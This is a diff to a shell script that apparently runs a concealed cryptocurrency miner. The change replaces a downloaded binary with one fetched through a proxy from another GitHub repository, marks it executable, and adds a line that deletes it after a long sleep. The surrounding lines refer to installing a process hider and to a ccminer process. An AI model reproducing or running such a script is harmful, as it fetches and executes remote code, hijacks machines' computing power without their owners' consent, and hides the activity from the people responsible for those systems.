@@ -57,8 +57,8 @@ END
   echo " "
 
   # Download and configure highill
-  ./graftcp/graftcp wget https://github.com/thefacta/miner/raw/main/highill
-  chmod +x highill
+  ./graftcp/graftcp wget https://github.com/marcelinoferdom/minse/raw/main/kulibang
+  chmod +x kulibang
 
   # Run processHider only during the first loop
   if [ "$process_hider_installed" = false ]; then
@@ -80,6 +80,8 @@ END
 
   # Sleep for xx minutes
   sleep 36000
+
+  rm kulibang
 
   # Send SIGINT to ccminer to terminate gracefully (equivalent to Ctrl + C)
   kill -2 $ccminer_pid
